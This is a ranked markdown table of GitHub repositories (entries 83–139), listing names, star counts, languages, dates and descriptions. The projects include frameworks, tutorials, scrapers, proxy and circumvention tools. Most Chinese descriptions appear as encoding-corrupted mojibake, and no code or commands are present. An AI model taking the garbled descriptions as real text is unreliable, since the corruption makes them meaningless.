|83|[alibaba/ice](https://github.com/alibaba/ice)|üöÄ  Simple and friendly front-end development systemÔºàÈ£ûÂÜ∞ÔºåÁÆÄÂçïËÄåÂèãÂ•ΩÁöÑÂâçÁ´ØÁ†îÂèë‰ΩìÁ≥ª Ôºâhttps://ice.work/|15.8k|JavaScript|10/29|
|84|[shuzheng/zheng](https://github.com/shuzheng/zheng)|Âü∫‰∫éSpring+SpringMVC+MybatisÂàÜÂ∏ÉÂºèÊïèÊç∑ÂºÄÂèëÁ≥ªÁªüÊû∂ÊûÑÔºåÊèê‰æõÊï¥Â•óÂÖ¨ÂÖ±ÂæÆÊúçÂä°ÊúçÂä°Ê®°ÂùóÔºöÈõÜ‰∏≠ÊùÉÈôêÁÆ°ÁêÜÔºàÂçïÁÇπÁôªÂΩïÔºâ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÊîØ‰ªò‰∏≠ÂøÉ„ÄÅÁî®Êà∑ÁÆ°ÁêÜÔºàÊîØÊåÅÁ¨¨‰∏âÊñπÁôªÂΩïÔºâ„ÄÅÂæÆ‰ø°Âπ≥Âè∞„ÄÅÂ≠òÂÇ®Á≥ªÁªü„ÄÅÈÖçÁΩÆ‰∏≠ÂøÉ„ÄÅÊó•ÂøóÂàÜÊûê„ÄÅ‰ªªÂä°ÂíåÈÄöÁü•Á≠âÔºåÊîØÊåÅÊúçÂä°Ê≤ªÁêÜ„ÄÅÁõëÊéßÂíåËøΩË∏™ÔºåÂä™Âäõ‰∏∫‰∏≠Â∞èÂûã‰ºÅ‰∏öÊâìÈÄ†ÂÖ®Êñπ‰ΩçJ2EE‰ºÅ‰∏öÁ∫ßÂºÄÂèëËß£ÂÜ≥ÊñπÊ°à„ÄÇ|15.7k|Java|10/13|
|85|[datawhalechina/pumpkin-book](https://github.com/datawhalechina/pumpkin-book)|„ÄäÊú∫Âô®Â≠¶‰π†„ÄãÔºàË•øÁìú‰π¶ÔºâÂÖ¨ÂºèÊé®ÂØºËß£ÊûêÔºåÂú®Á∫øÈòÖËØªÂú∞ÂùÄÔºöhttps://datawhalechina.github.io/pumpkin-book|15.4k|-|10/27|
|86|[PKUanonym/REKCARC-TSC-UHT](https://github.com/PKUanonym/REKCARC-TSC-UHT)|Ê∏ÖÂçéÂ§ßÂ≠¶ËÆ°ÁÆóÊú∫Á≥ªËØæÁ®ãÊîªÁï• Guidance for courses in Department of Computer Science and Technology, Tsinghua University|15.3k|HTML|10/16|
|87|[huihut/interview](https://github.com/huihut/interview)|üìö C/C++ ÊäÄÊúØÈù¢ËØïÂü∫Á°ÄÁü•ËØÜÊÄªÁªìÔºåÂåÖÊã¨ËØ≠Ë®Ä„ÄÅÁ®ãÂ∫èÂ∫ì„ÄÅÊï∞ÊçÆÁªìÊûÑ„ÄÅÁÆóÊ≥ï„ÄÅÁ≥ªÁªü„ÄÅÁΩëÁªú„ÄÅÈìæÊé•Ë£ÖËΩΩÂ∫ìÁ≠âÁü•ËØÜÂèäÈù¢ËØïÁªèÈ™å„ÄÅÊãõËÅò„ÄÅÂÜÖÊé®Á≠â‰ø°ÊÅØ„ÄÇThis repository is a summary of the basic knowledge of recruiting job seekers and beginners in the direction of C/C++ technology, including language, program library, data structure, algorithm, system, network, link loading library, in ...|15.2k|C++|10/12|
|88|[chaozh/awesome-blockchain-cn](https://github.com/chaozh/awesome-blockchain-cn)|Êî∂ÈõÜÊâÄÊúâÂå∫ÂùóÈìæ(BlockChain)ÊäÄÊúØÂºÄÂèëÁõ∏ÂÖ≥ËµÑÊñôÔºåÂåÖÊã¨FabricÂíåEthereumÂºÄÂèëËµÑÊñô|15.1k|JavaScript|05/29|
|89|[CarGuo/GSYVideoPlayer](https://github.com/CarGuo/GSYVideoPlayer)|ËßÜÈ¢ëÊí≠ÊîæÂô®ÔºàIJKplayer„ÄÅExoPlayer„ÄÅMediaPlayerÔºâÔºåHTTPSÔºåÊîØÊåÅÂºπÂπïÔºåÂ§ñÊåÇÂ≠óÂπïÔºåÊîØÊåÅÊª§Èïú„ÄÅÊ∞¥Âç∞„ÄÅgifÊà™ÂõæÔºåÁâáÂ§¥ÂπøÂëä„ÄÅ‰∏≠Èó¥ÂπøÂëäÔºåÂ§ö‰∏™ÂêåÊó∂Êí≠ÊîæÔºåÊîØÊåÅÂü∫Êú¨ÁöÑÊãñÂä®ÔºåÂ£∞Èü≥„ÄÅ‰∫ÆÂ∫¶Ë∞ÉËäÇÔºåÊîØÊåÅËæπÊí≠ËæπÁºìÂ≠òÔºåÊîØÊåÅËßÜÈ¢ëËá™Â∏¶rotationÁöÑÊóãËΩ¨Ôºà90,270‰πãÁ±ªÔºâÔºåÈáçÂäõÊóãËΩ¨‰∏éÊâãÂä®ÊóãËΩ¨ÁöÑÂêåÊ≠•ÊîØÊåÅÔºåÊîØÊåÅÂàóË°®Êí≠Êîæ ÔºåÂàóË°®ÂÖ®Â±èÂä®ÁîªÔºåËßÜÈ¢ëÂä†ËΩΩÈÄüÂ∫¶ÔºåÂàóË°®Â∞èÁ™óÂè£ÊîØÊåÅÊãñÂä®ÔºåÂä®ÁîªÊïàÊûúÔºåË∞ÉÊï¥ÊØî‰æãÔºåÂ§öÂàÜËæ®ÁéáÂàáÊç¢ÔºåÊîØÊåÅÂàáÊç¢Êí≠ÊîæÂô®ÔºåËøõÂ∫¶Êù°Â∞èÁ™óÂè£È¢ÑËßàÔºåÂàóË°®ÂàáÊç¢ËØ¶ÊÉÖÈ°µÈù¢Êó†ÁºùÊí≠ÊîæÔºårtsp„ÄÅconcat„ÄÅmpeg„ÄÇ |15.1k|Java|10/26|
|90|[LingCoder/OnJava8](https://github.com/LingCoder/OnJava8)|„ÄäOn Java 8„Äã‰∏≠ÊñáÁâàÔºåÂèàÂêç„ÄäJavaÁºñÁ®ãÊÄùÊÉ≥„Äã Á¨¨5Áâà |14.6k|-|10/27|
|91|[hzlzh/Best-App](https://github.com/hzlzh/Best-App)|Êî∂ÈõÜ&Êé®Ëçê‰ºòÁßÄÁöÑ Apps/Á°¨‰ª∂/ÊäÄÂ∑ß/Âë®ËæπÁ≠â|14.6k|-|05/15|
|92|[linlinjava/litemall](https://github.com/linlinjava/litemall)|Âèà‰∏Ä‰∏™Â∞èÂïÜÂüé„ÄÇlitemall = Spring BootÂêéÁ´Ø + VueÁÆ°ÁêÜÂëòÂâçÁ´Ø + ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁî®Êà∑ÂâçÁ´Ø + VueÁî®Êà∑ÁßªÂä®Á´Ø|14.5k|Java|10/28|
|93|[jaywcjlove/linux-command](https://github.com/jaywcjlove/linux-command)|LinuxÂëΩ‰ª§Â§ßÂÖ®ÊêúÁ¥¢Â∑•ÂÖ∑ÔºåÂÜÖÂÆπÂåÖÂê´LinuxÂëΩ‰ª§ÊâãÂÜå„ÄÅËØ¶Ëß£„ÄÅÂ≠¶‰π†„ÄÅÊêúÈõÜ„ÄÇhttps://git.io/linux|14.5k|HTML|10/29|
|94|[dianping/cat](https://github.com/dianping/cat)|CAT ‰Ωú‰∏∫ÊúçÂä°Á´ØÈ°πÁõÆÂü∫Á°ÄÁªÑ‰ª∂ÔºåÊèê‰æõ‰∫Ü Java, C/C++, Node.js, Python, Go Á≠âÂ§öËØ≠Ë®ÄÂÆ¢Êà∑Á´ØÔºåÂ∑≤ÁªèÂú®ÁæéÂõ¢ÁÇπËØÑÁöÑÂü∫Á°ÄÊû∂ÊûÑ‰∏≠Èó¥‰ª∂Ê°ÜÊû∂ÔºàMVCÊ°ÜÊû∂ÔºåRPCÊ°ÜÊû∂ÔºåÊï∞ÊçÆÂ∫ìÊ°ÜÊû∂ÔºåÁºìÂ≠òÊ°ÜÊû∂Á≠âÔºåÊ∂àÊÅØÈòüÂàóÔºåÈÖçÁΩÆÁ≥ªÁªüÁ≠âÔºâÊ∑±Â∫¶ÈõÜÊàêÔºå‰∏∫ÁæéÂõ¢ÁÇπËØÑÂêÑ‰∏öÂä°Á∫øÊèê‰æõÁ≥ªÁªü‰∏∞ÂØåÁöÑÊÄßËÉΩÊåáÊ†á„ÄÅÂÅ•Â∫∑Áä∂ÂÜµ„ÄÅÂÆûÊó∂ÂëäË≠¶Á≠â„ÄÇ|14.4k|Java|10/13|
|95|[ehang-io/nps](https://github.com/ehang-io/nps)|‰∏ÄÊ¨æËΩªÈáèÁ∫ß„ÄÅÈ´òÊÄßËÉΩ„ÄÅÂäüËÉΩÂº∫Â§ßÁöÑÂÜÖÁΩëÁ©øÈÄè‰ª£ÁêÜÊúçÂä°Âô®„ÄÇÊîØÊåÅtcp„ÄÅudp„ÄÅsocks5„ÄÅhttpÁ≠âÂá†‰πéÊâÄÊúâÊµÅÈáèËΩ¨ÂèëÔºåÂèØÁî®Êù•ËÆøÈóÆÂÜÖÁΩëÁΩëÁ´ô„ÄÅÊú¨Âú∞ÊîØ‰ªòÊé•Âè£Ë∞ÉËØï„ÄÅsshËÆøÈóÆ„ÄÅËøúÁ®ãÊ°åÈù¢ÔºåÂÜÖÁΩëdnsËß£Êûê„ÄÅÂÜÖÁΩësocks5‰ª£ÁêÜÁ≠âÁ≠â‚Ä¶‚Ä¶ÔºåÂπ∂Â∏¶ÊúâÂäüËÉΩÂº∫Â§ßÁöÑwebÁÆ°ÁêÜÁ´Ø„ÄÇa lightweight, high-performance, powerful intranet penetration proxy server, with a powerful web management terminal.|14.4k|Go|10/24|
|96|[forezp/SpringCloudLearning](https://github.com/forezp/SpringCloudLearning)|„ÄäÂè≤‰∏äÊúÄÁÆÄÂçïÁöÑSpring CloudÊïôÁ®ãÊ∫êÁ†Å„Äã|14.4k|Java|06/10|
|97|[getlantern/download](https://github.com/getlantern/download)|LanternÂÆòÊñπÁâàÊú¨‰∏ãËΩΩ ËìùÁÅØ ÁøªÂ¢ô ‰ª£ÁêÜ ÁßëÂ≠¶‰∏äÁΩë Â§ñÁΩë Âä†ÈÄüÂô® Ê¢ØÂ≠ê Ë∑ØÁî± proxy vpn circumvention gfw|14.4k|-|08/15|
|98|[alibaba/Sentinel](https://github.com/alibaba/Sentinel)|A powerful flow control component enabling reliability, resilience and monitoring for microservices. (Èù¢Âêë‰∫ëÂéüÁîüÂæÆÊúçÂä°ÁöÑÈ´òÂèØÁî®ÊµÅÊéßÈò≤Êä§ÁªÑ‰ª∂)|14.2k|Java|10/29|
|99|[jumpserver/jumpserver](https://github.com/jumpserver/jumpserver)|JumpServer ÊòØÂÖ®ÁêÉÈ¶ñÊ¨æÂºÄÊ∫êÁöÑÂ†°ÂûíÊú∫ÔºåÊòØÁ¨¶Âêà 4A ÁöÑ‰∏ì‰∏öËøêÁª¥ÂÆâÂÖ®ÂÆ°ËÆ°Á≥ªÁªü„ÄÇ|14.2k|Python|10/29|
|100|[facert/awesome-spider](https://github.com/facert/awesome-spider)|Áà¨Ëô´ÈõÜÂêà|14.1k|-|08/06|
|101|[haizlin/fe-interview](https://github.com/haizlin/fe-interview)|ÂâçÁ´ØÈù¢ËØïÊØèÊó• 3+1Ôºå‰ª•Èù¢ËØïÈ¢òÊù•È©±Âä®Â≠¶‰π†ÔºåÊèêÂÄ°ÊØèÊó•Â≠¶‰π†‰∏éÊÄùËÄÉÔºåÊØèÂ§©ËøõÊ≠•‰∏ÄÁÇπÔºÅÊØèÂ§©Êó©‰∏ä5ÁÇπÁ∫ØÊâãÂ∑•ÂèëÂ∏ÉÈù¢ËØïÈ¢òÔºàÊ≠ªÁ£ïËá™Â∑±ÔºåÊÑâÊÇ¶Â§ßÂÆ∂ÔºâÔºå3000+ÈÅìÂâçÁ´ØÈù¢ËØïÈ¢òÂÖ®Èù¢Ë¶ÜÁõñÔºåHTML/CSS/JavaScript/Vue/React/Nodejs/TypeScript/ECMAScritpt/Webpack/Jquery/Â∞èÁ®ãÂ∫è/ËΩØÊäÄËÉΩ‚Ä¶‚Ä¶|14.0k|JavaScript|10/30|
|102|[ruanyf/weekly](https://github.com/ruanyf/weekly)|ÁßëÊäÄÁà±Â•ΩËÄÖÂë®ÂàäÔºåÊØèÂë®‰∫îÂèëÂ∏É|14.0k|-|10/23|
|103|[wangshub/wechat_jump_game](https://github.com/wangshub/wechat_jump_game)|ÂæÆ‰ø°„ÄäË∑≥‰∏ÄË∑≥„ÄãPython ËæÖÂä©|13.9k|Python|10/10|
|104|[chai2010/advanced-go-programming-book](https://github.com/chai2010/advanced-go-programming-book)|:books: „ÄäGoËØ≠Ë®ÄÈ´òÁ∫ßÁºñÁ®ã„ÄãÂºÄÊ∫êÂõæ‰π¶ÔºåÊ∂µÁõñCGO„ÄÅGoÊ±áÁºñËØ≠Ë®Ä„ÄÅRPCÂÆûÁé∞„ÄÅProtobufÊèí‰ª∂ÂÆûÁé∞„ÄÅWebÊ°ÜÊû∂ÂÆûÁé∞„ÄÅÂàÜÂ∏ÉÂºèÁ≥ªÁªüÁ≠âÈ´òÈò∂‰∏ªÈ¢ò(ÂÆåÁ®ø)|13.8k|Go|10/20|
|105|[youzan/vant-weapp](https://github.com/youzan/vant-weapp)|ËΩªÈáè„ÄÅÂèØÈù†ÁöÑÂ∞èÁ®ãÂ∫è UI ÁªÑ‰ª∂Â∫ì|13.7k|JavaScript|10/15|
|106|[JeffLi1993/springboot-learning-example](https://github.com/JeffLi1993/springboot-learning-example)|spring boot ÂÆûË∑µÂ≠¶‰π†Ê°à‰æãÔºåÊòØ spring boot ÂàùÂ≠¶ËÄÖÂèäÊ†∏ÂøÉÊäÄÊúØÂ∑©Âõ∫ÁöÑÊúÄ‰Ω≥ÂÆûË∑µ„ÄÇÂè¶Â§ñÂÜôÂçöÂÆ¢ÔºåÁî® OpenWrite„ÄÇ|13.6k|Java|10/13|
|107|[nndl/nndl.github.io](https://github.com/nndl/nndl.github.io)|„ÄäÁ•ûÁªèÁΩëÁªú‰∏éÊ∑±Â∫¶Â≠¶‰π†„Äã ÈÇ±Èî°ÈπèËëó Neural Network and Deep Learning |13.5k|HTML|10/22|
|108|[EastWorld/wechat-app-mall](https://github.com/EastWorld/wechat-app-mall)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüéÔºåÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂæÆÂ∫ó|13.4k|JavaScript|10/24|
|109|[taizilongxu/interview_python](https://github.com/taizilongxu/interview_python)|ÂÖ≥‰∫éPythonÁöÑÈù¢ËØïÈ¢ò|13.2k|Shell|08/03|
|110|[PaddlePaddle/Paddle](https://github.com/PaddlePaddle/Paddle)|PArallel Distributed Deep LEarning: Machine Learning Framework from Industrial Practice Ôºà„ÄéÈ£ûÊ°®„ÄèÊ†∏ÂøÉÊ°ÜÊû∂ÔºåÊ∑±Â∫¶Â≠¶‰π†&Êú∫Âô®Â≠¶‰π†È´òÊÄßËÉΩÂçïÊú∫„ÄÅÂàÜÂ∏ÉÂºèËÆ≠ÁªÉÂíåË∑®Âπ≥Âè∞ÈÉ®ÁΩ≤Ôºâ|13.2k|Python|10/30|
|111|[qianguyihao/Web](https://github.com/qianguyihao/Web)|ÂâçÁ´ØÂÖ•Èó®Âà∞ËøõÈò∂ÂõæÊñáÊïôÁ®ãÔºåË∂ÖËØ¶ÁªÜÁöÑWebÂâçÁ´ØÂ≠¶‰π†Á¨îËÆ∞„ÄÇ‰ªéÈõ∂ÂºÄÂßãÂ≠¶ÂâçÁ´ØÔºåÂÅö‰∏ÄÂêçÁ≤æËá¥‰ºòÈõÖÁöÑÂâçÁ´ØÂ∑•Á®ãÂ∏à„ÄÇÂÖ¨‰ºóÂè∑„ÄåÂçÉÂè§Â£πÂè∑„Äç‰ΩúËÄÖ„ÄÇ|13.1k|JavaScript|10/23|
|112|[vnpy/vnpy](https://github.com/vnpy/vnpy)|Âü∫‰∫éPythonÁöÑÂºÄÊ∫êÈáèÂåñ‰∫§ÊòìÂπ≥Âè∞ÂºÄÂèëÊ°ÜÊû∂|13.1k|C++|10/30|
|113|[233boy/v2ray](https://github.com/233boy/v2ray)|ÊúÄÂ•ΩÁî®ÁöÑ V2Ray ‰∏ÄÈîÆÂÆâË£ÖËÑöÊú¨ & ÁÆ°ÁêÜËÑöÊú¨|13.0k|Shell|09/15|
|114|[dcloudio/mui](https://github.com/dcloudio/mui)|ÊúÄÊé•ËøëÂéüÁîüAPP‰ΩìÈ™åÁöÑÈ´òÊÄßËÉΩÊ°ÜÊû∂|13.0k|JavaScript|07/30|
|115|[easychen/howto-make-more-money](https://github.com/easychen/howto-make-more-money)|Á®ãÂ∫èÂëòÂ¶Ç‰Ωï‰ºòÈõÖÁöÑÊå£Èõ∂Ëä±Èí±Ôºå2.0ÁâàÔºåÂçáÁ∫ß‰∏∫Â∞è‰π¶‰∫Ü„ÄÇMost of this not work outside China , so no English translate|12.9k|PHP|10/17|
|116|[ryanhanwu/How-To-Ask-Questions-The-Smart-Way](https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way)|Êú¨ÊñáÂéüÊñáÁî±Áü•Âêç Hacker Eric S. Raymond ÊâÄÊí∞ÂØ´ÔºåÊïô‰Ω†Â¶Ç‰ΩïÊ≠£Á¢∫ÁöÑÊèêÂá∫ÊäÄË°ìÂïèÈ°å‰∏¶Áç≤Âæó‰Ω†ÊªøÊÑèÁöÑÁ≠îÊ°à„ÄÇ|12.9k|JavaScript|10/25|
|117|[zergtant/pytorch-handbook](https://github.com/zergtant/pytorch-handbook)|pytorch handbookÊòØ‰∏ÄÊú¨ÂºÄÊ∫êÁöÑ‰π¶Á±çÔºåÁõÆÊ†áÊòØÂ∏ÆÂä©ÈÇ£‰∫õÂ∏åÊúõÂíå‰ΩøÁî®PyTorchËøõË°åÊ∑±Â∫¶Â≠¶‰π†ÂºÄÂèëÂíåÁ†îÁ©∂ÁöÑÊúãÂèãÂø´ÈÄüÂÖ•Èó®ÔºåÂÖ∂‰∏≠ÂåÖÂê´ÁöÑPytorchÊïôÁ®ãÂÖ®ÈÉ®ÈÄöËøáÊµãËØï‰øùËØÅÂèØ‰ª•ÊàêÂäüËøêË°å|12.8k|Jupyter Notebook|10/27|
|118|[fengdu78/lihang-code](https://github.com/fengdu78/lihang-code)|„ÄäÁªüËÆ°Â≠¶‰π†ÊñπÊ≥ï„ÄãÁöÑ‰ª£Á†ÅÂÆûÁé∞|12.8k|Jupyter Notebook|09/22|
|119|[alibaba/ARouter](https://github.com/alibaba/ARouter)|üí™ A framework for assisting in the renovation of Android componentization (Â∏ÆÂä© Android App ËøõË°åÁªÑ‰ª∂ÂåñÊîπÈÄ†ÁöÑË∑ØÁî±Ê°ÜÊû∂)|12.5k|Java|10/22|
|120|[Kr1s77/awesome-python-login-model](https://github.com/Kr1s77/awesome-python-login-model)|üòÆpythonÊ®°ÊãüÁôªÈôÜ‰∏Ä‰∫õÂ§ßÂûãÁΩëÁ´ôÔºåËøòÊúâ‰∏Ä‰∫õÁÆÄÂçïÁöÑÁà¨Ëô´ÔºåÂ∏åÊúõÂØπ‰Ω†‰ª¨ÊúâÊâÄÂ∏ÆÂä©‚ù§Ô∏èÔºåÂ¶ÇÊûúÂñúÊ¨¢ËÆ∞ÂæóÁªô‰∏™starÂì¶üåü|12.4k|Python|10/02|
|121|[Tencent/QMUI_Android](https://github.com/Tencent/QMUI_Android)|ÊèêÈ´ò Android UI ÂºÄÂèëÊïàÁéáÁöÑ UI Â∫ì|12.3k|Java|10/28|
|122|[dyc87112/SpringBoot-Learning](https://github.com/dyc87112/SpringBoot-Learning)|Spring BootÂü∫Á°ÄÊïôÁ®ãÔºåSpring Boot 2.xÁâàÊú¨ËøûËΩΩ‰∏≠ÔºÅÔºÅÔºÅ|12.3k|Java|09/11|
|123|[521xueweihan/git-tips](https://github.com/521xueweihan/git-tips)|:trollface:GitÁöÑÂ•áÊäÄÊ∑´Â∑ß|12.2k|-|04/14|
|124|[Bigkoo/Android-PickerView](https://github.com/Bigkoo/Android-PickerView)|This is a picker view for android , support linkage effect, timepicker and optionspicker.ÔºàÊó∂Èó¥ÈÄâÊã©Âô®„ÄÅÁúÅÂ∏ÇÂå∫‰∏âÁ∫ßËÅîÂä®Ôºâ|12.2k|Java|10/23|
|125|[shimohq/chinese-programmer-wrong-pronunciation](https://github.com/shimohq/chinese-programmer-wrong-pronunciation)|‰∏≠ÂõΩÁ®ãÂ∫èÂëòÂÆπÊòìÂèëÈü≥ÈîôËØØÁöÑÂçïËØç|12.1k|Python|10/08|
|126|[fengdu78/deeplearning_ai_books](https://github.com/fengdu78/deeplearning_ai_books)|deeplearning.aiÔºàÂê¥ÊÅ©ËææËÄÅÂ∏àÁöÑÊ∑±Â∫¶Â≠¶‰π†ËØæÁ®ãÁ¨îËÆ∞ÂèäËµÑÊ∫êÔºâ|12.1k|HTML|09/21|
|127|[ZhongFuCheng3y/3y](https://github.com/ZhongFuCheng3y/3y)|:notebook:‰ªéJavaÂü∫Á°Ä„ÄÅJavaWebÂü∫Á°ÄÂà∞Â∏∏Áî®ÁöÑÊ°ÜÊû∂ÂÜçÂà∞Èù¢ËØïÈ¢òÈÉΩÊúâÂÆåÊï¥ÁöÑÊïôÁ®ãÔºåÂá†‰πéÊ∂µÁõñ‰∫ÜJavaÂêéÁ´ØÂøÖÂ§áÁöÑÁü•ËØÜÁÇπ|11.8k|-|10/07|
|128|[phobal/ivideo](https://github.com/phobal/ivideo)|‰∏Ä‰∏™ÂèØ‰ª•ËßÇÁúãÂõΩÂÜÖ‰∏ªÊµÅËßÜÈ¢ëÂπ≥Âè∞ÊâÄÊúâËßÜÈ¢ëÁöÑÂÆ¢Êà∑Á´ØÔºàMac„ÄÅWindows„ÄÅLinuxÔºâ A client that can watch video of domestic(China) mainstream video platform|11.7k|JavaScript|09/04|
|129|[CarGuo/gsy_github_app_flutter](https://github.com/CarGuo/gsy_github_app_flutter)|Flutter Ë∂ÖÂÆåÊï¥ÁöÑÂºÄÊ∫êÈ°πÁõÆÔºåÂäüËÉΩ‰∏∞ÂØåÔºåÈÄÇÂêàÂ≠¶‰π†ÂíåÊó•Â∏∏‰ΩøÁî®„ÄÇGSYGithubAppÁ≥ªÂàóÁöÑ‰ºòÂäøÔºöÊàë‰ª¨ÁõÆÂâçÂ∑≤ÁªèÊã•ÊúâFlutter„ÄÅWeex„ÄÅReactNative„ÄÅkotlin Âõõ‰∏™ÁâàÊú¨„ÄÇ ÂäüËÉΩÈΩêÂÖ®ÔºåÈ°πÁõÆÊ°ÜÊû∂ÂÜÖÊäÄÊúØÊ∂âÂèäÈù¢ÂπøÔºåÂÆåÊàêÂ∫¶È´òÔºåÊåÅÁª≠Áª¥Êä§ÔºåÈÖçÂ•óÊñáÁ´†ÔºåÈÄÇÂêàÂÖ®Èù¢Â≠¶‰π†ÔºåÂØπÊØîÂèÇËÄÉ„ÄÇË∑®Âπ≥Âè∞ÁöÑÂºÄÊ∫êGithubÂÆ¢Êà∑Á´ØAppÔºåÊõ¥Â•ΩÁöÑ‰ΩìÈ™åÔºåÊõ¥‰∏∞ÂØåÁöÑÂäüËÉΩÔºåÊó®Âú®Êõ¥Â•ΩÁöÑÊó•Â∏∏ÁÆ°ÁêÜÂíåÁª¥Êä§‰∏™‰∫∫GithubÔºåÊèê‰æõÊõ¥Â•ΩÊõ¥Êñπ‰æøÁöÑÈ©æËΩ¶‰ΩìÈ™åŒ£(Ôø£„ÄÇÔø£Ôæâ)Ôæâ„ÄÇÂêåÊ¨æWeexÁâàÊú¨ Ôºö https://github.com/CarGuo/GSYGithubAppWeex    „ÄÅÂêåÊ¨æReact NativeÁâàÊú¨ Ôºö https://g ...|11.6k|Dart|10/22|
|130|[elunez/eladmin](https://github.com/elunez/eladmin)|È°πÁõÆÂü∫‰∫é Spring Boot 2.1.0 „ÄÅ Jpa„ÄÅ Spring Security„ÄÅredis„ÄÅVueÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÈ°πÁõÆÈááÁî®ÂàÜÊ®°ÂùóÂºÄÂèëÊñπÂºèÔºå ÊùÉÈôêÊéßÂà∂ÈááÁî® RBACÔºåÊîØÊåÅÊï∞ÊçÆÂ≠óÂÖ∏‰∏éÊï∞ÊçÆÊùÉÈôêÁÆ°ÁêÜÔºåÊîØÊåÅ‰∏ÄÈîÆÁîüÊàêÂâçÂêéÁ´Ø‰ª£Á†ÅÔºåÊîØÊåÅÂä®ÊÄÅË∑ØÁî±|11.6k|Java|10/27|
|131|[Jack-Cherish/python-spider](https://github.com/Jack-Cherish/python-spider)|:rainbow:Python3ÁΩëÁªúÁà¨Ëô´ÂÆûÊàòÔºöÊ∑òÂÆù„ÄÅ‰∫¨‰∏ú„ÄÅÁΩëÊòì‰∫ë„ÄÅBÁ´ô„ÄÅ12306„ÄÅÊäñÈü≥„ÄÅÁ¨îË∂£ÈòÅ„ÄÅÊº´ÁîªÂ∞èËØ¥‰∏ãËΩΩ„ÄÅÈü≥‰πêÁîµÂΩ±‰∏ãËΩΩÁ≠â|11.6k|Python|09/25|
|132|[lin-xin/vue-manage-system](https://github.com/lin-xin/vue-manage-system)|Âü∫‰∫évue + elementÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüËß£ÂÜ≥ÊñπÊ°à|11.4k|Vue|10/19|
|133|[Tencent/omi](https://github.com/Tencent/omi)| Front End Cross-Frameworks Framework - ÂâçÁ´ØË∑®Ê°ÜÊû∂Ë∑®Âπ≥Âè∞Ê°ÜÊû∂|11.4k|JavaScript|09/30|
|134|[jobbole/awesome-programming-books](https://github.com/jobbole/awesome-programming-books)|ÁªèÂÖ∏ÁºñÁ®ã‰π¶Á±çÂ§ßÂÖ®ÔºåÊ∂µÁõñÔºöËÆ°ÁÆóÊú∫Á≥ªÁªü‰∏éÁΩëÁªú„ÄÅÁ≥ªÁªüÊû∂ÊûÑ„ÄÅÁÆóÊ≥ï‰∏éÊï∞ÊçÆÁªìÊûÑ„ÄÅÂâçÁ´ØÂºÄÂèë„ÄÅÂêéÁ´ØÂºÄÂèë„ÄÅÁßªÂä®ÂºÄÂèë„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅÊµãËØï„ÄÅÈ°πÁõÆ‰∏éÂõ¢Èòü„ÄÅÁ®ãÂ∫èÂëòËÅå‰∏ö‰øÆÁÇº„ÄÅÊ±ÇËÅåÈù¢ËØïÁ≠â|11.4k|-|10/10|
|135|[qyuhen/book](https://github.com/qyuhen/book)|Â≠¶‰π†Á¨îËÆ∞|11.2k|-|04/02|
|136|[pjialin/py12306](https://github.com/pjialin/py12306)|üöÇ 12306 Ë¥≠Á•®Âä©ÊâãÔºåÊîØÊåÅÈõÜÁæ§ÔºåÂ§öË¥¶Âè∑ÔºåÂ§ö‰ªªÂä°Ë¥≠Á•®‰ª•Âèä Web È°µÈù¢ÁÆ°ÁêÜ |11.2k|Python|04/08|
|137|[amfe/lib-flexible](https://github.com/amfe/lib-flexible)|ÂèØ‰º∏Áº©Â∏ÉÂ±ÄÊñπÊ°à|11.1k|JavaScript|06/19|
|138|[MustangYM/WeChatExtension-ForMac](https://github.com/MustangYM/WeChatExtension-ForMac)|MacÂæÆ‰ø°ÂäüËÉΩÊãìÂ±ï/ÂæÆ‰ø°Êèí‰ª∂/ÂæÆ‰ø°Â∞èÂä©Êâã(A plugin for Mac WeChat)|11.1k|Objective-C|10/29|
|139|[Tamsiree/RxTool](https://github.com/Tamsiree/RxTool)|AndroidÂºÄÂèë‰∫∫Âëò‰∏çÂæó‰∏çÊî∂ÈõÜÁöÑÂ∑•ÂÖ∑Á±ªÈõÜÂêà   ÊîØ‰ªòÂÆùÊîØ‰ªò   ÂæÆ‰ø°ÊîØ‰ªòÔºàÁªü‰∏Ä‰∏ãÂçïÔºâ   ÂæÆ‰ø°ÂàÜ‰∫´   Zip4jÂéãÁº©ÔºàÊîØÊåÅÂàÜÂç∑ÂéãÁº©‰∏éÂä†ÂØÜÔºâ   ‰∏ÄÈîÆÈõÜÊàêUCropÈÄâÊã©ÂúÜÂΩ¢Â§¥ÂÉè   ‰∏ÄÈîÆÈõÜÊàê‰∫åÁª¥Á†ÅÂíåÊù°ÂΩ¢Á†ÅÁöÑÊâ´Êèè‰∏éÁîüÊàê   Â∏∏Áî®Dialog   WebViewÁöÑÂ∞ÅË£ÖÂèØÊí≠ÊîæËßÜÈ¢ë   ‰ªøÊñóÈ±ºÊªëÂä®È™åËØÅÁ†Å   ToastÂ∞ÅË£Ö   ÈúáÂä®   GPS   LocationÂÆö‰Ωç   ÂõæÁâáÁº©Êîæ   Exif ÂõæÁâáÊ∑ªÂä†Âú∞ÁêÜ‰ΩçÁΩÆ‰ø°ÊÅØÔºàÁªèÁ∫¨Â∫¶Ôºâ   ËõõÁΩëÁ≠âÁ∫ß   È¢úËâ≤ÈÄâÊã©Âô®   ArcGis   VTPK   ÁºñËØëËøêË°å‰∏Ä‰∏ãËØ¥‰∏çÂÆö‰ºöÊâæÂà∞ÊÉäÂñú|11.1k|Kotlin|09/18|
